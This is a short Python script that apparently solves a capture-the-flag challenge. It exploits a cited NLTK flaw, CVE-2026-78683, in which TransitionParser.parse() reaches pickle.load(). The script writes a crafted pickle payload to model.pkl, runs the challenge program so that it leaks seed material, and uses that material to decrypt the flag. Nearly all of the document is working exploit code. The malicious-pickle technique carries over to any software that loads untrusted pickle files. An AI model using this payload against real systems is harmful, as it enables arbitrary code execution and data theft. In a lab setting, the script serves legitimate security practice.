import base64, subprocess, sys, re, hashlib

# CVE-2026-78683: TransitionParser.parse() reaches pickle.load() on NLTK < 3.10.0.
# The payload first arms the source helper, then invokes it.
payload = b"c__main__\narm\n)Rc__main__\nreveal_material\n)R."
with open("model.pkl", "wb") as f:
    f.write(payload)

p = subprocess.run([sys.executable, "Divergence.py"], capture_output=True, text=True)
print(p.stdout, end="")
if "DIVERGENCE_MATERIAL=" not in p.stdout:
    print(p.stderr, file=sys.stderr)
    raise SystemExit("exploit did not trigger; use nltk==3.9.4")

seed = base64.b64decode(re.search(r"DIVERGENCE_MATERIAL=([A-Za-z0-9+/=]+)", p.stdout).group(1))
txt = open("output.txt").read()
nonce = base64.b64decode(re.search(r"nonce = (.+)", txt).group(1))
ct = base64.b64decode(re.search(r"ciphertext = (.+)", txt).group(1))

key = hashlib.sha256(seed).digest()
stream = hashlib.sha256(key + nonce).digest()
flag = bytes(a ^ b for a, b in zip(ct, (stream * 4)[:len(ct)]))
print("FLAG =", flag.decode())
